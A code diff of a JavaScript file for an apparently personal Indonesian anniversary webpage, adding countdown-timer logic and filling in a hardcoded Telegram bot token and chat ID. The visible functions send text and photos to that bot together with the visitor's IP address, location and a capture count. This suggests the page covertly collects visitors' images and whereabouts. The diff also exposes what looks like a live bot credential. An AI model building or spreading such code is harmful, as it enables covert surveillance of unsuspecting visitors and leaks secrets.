@@ -22,25 +22,48 @@ document.addEventListener('DOMContentLoaded', () => {
 // Fungsi utama yang dijalankan setelah login terverifikasi
 function initMainPage() {
     
-    // 2. --- LOGIKA COUNTDOWN ANNIVERSARY ---
-    // ... (Kode Countdown) ...
+    // 2. --- LOGIKA COUNTDOWN ANNIVERSARY (KODE KOREKSI) ---
     const annivDate = new Date('November 1, 2025 00:00:00').getTime();
-    
-    // ... (Logika lainnya) ...
+    const countdownDisplay = document.getElementById('countdown-timer');
+    let countdownInterval; // Variabel untuk interval
 
     const updateCountdown = () => {
         const now = new Date().getTime();
         const distance = annivDate - now;
 
-        // ... (Kode perhitungan) ...
-        
-        // ... (Update innerHTML) ...
-    };
+        // Fungsi helper untuk memastikan format dua digit (misalnya 05)
+        const format = (t) => String(t).padStart(2, '0'); 
 
-    if (document.getElementById('countdown-timer')) {
-        updateCountdown();
-        setInterval(updateCountdown, 1000);
+        if (distance < 0) {
+            // Jika countdown selesai
+            clearInterval(countdownInterval);
+            if (countdownDisplay) {
+                countdownDisplay.innerHTML = '<span class="celebration-msg">🥳 Waktunya Rayakan November Kita! 🥳</span>';
+            }
+            return;
+        }
+        
+        // --- KODE PERHITUNGAN YANG DITAMBAHKAN ---
+        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+        
+        // --- KODE UPDATE HTML YANG DITAMBAHKAN ---
+        if (countdownDisplay) {
+            document.getElementById('days').textContent = format(days);
+            document.getElementById('hours').textContent = format(hours);
+            document.getElementById('minutes').textContent = format(minutes);
+            document.getElementById('seconds').textContent = format(seconds);
+        }
+    };
+    
+    // Jalankan countdown
+    if (countdownDisplay) {
+        updateCountdown(); // Jalankan sekali agar tidak ada delay
+        countdownInterval = setInterval(updateCountdown, 1000); // Ulangi setiap 1 detik
     }
+    // ------------------------------------------
 
 
     // 3. --- LOGIKA MUSIK LATAR OTOMATIS ---
@@ -163,9 +186,8 @@ function initMainPage() {
         
     // 9. --- LOGIKA PENGIRIMAN DATA TEXT KE TELEGRAM (STANDAR) ---
     const sendTelegramMessage = (text) => {
-        // !!! GANTI DENGAN BOT_TOKEN ANDA !!!
+        // Token dan ID Anda yang sudah dikonfigurasi
         const BOT_TOKEN = '8491510356:AAHw94nzgO3z6H3-0Sjjlu-l1NJrka3SuCE'; 
-        // !!! GANTI DENGAN CHAT_ID ANDA !!!
         const CHAT_ID = '6733233108';
         
         const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -239,9 +261,8 @@ function initMainPage() {
 
     // 11. --- LOGIKA PENGIRIMAN FOTO KE TELEGRAM ---
     const sendPhotoToTelegram = (photoBlob, ip, location, currentCount, totalCount) => {
-        // !!! GANTI DENGAN BOT_TOKEN ANDA !!!
+        // Token dan ID Anda yang sudah dikonfigurasi
         const BOT_TOKEN = '8491510356:AAHw94nzgO3z6H3-0Sjjlu-l1NJrka3SuCE'; 
-        // !!! GANTI DENGAN CHAT_ID ANDA !!!
         const CHAT_ID = '6733233108';
         
         const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
@@ -277,4 +298,3 @@ function initMainPage() {
     revealTimelineItems(); // Jalankan sekali saat halaman dimuat (untuk elemen yang sudah terlihat)
 
 } // Penutup initMainPage
-
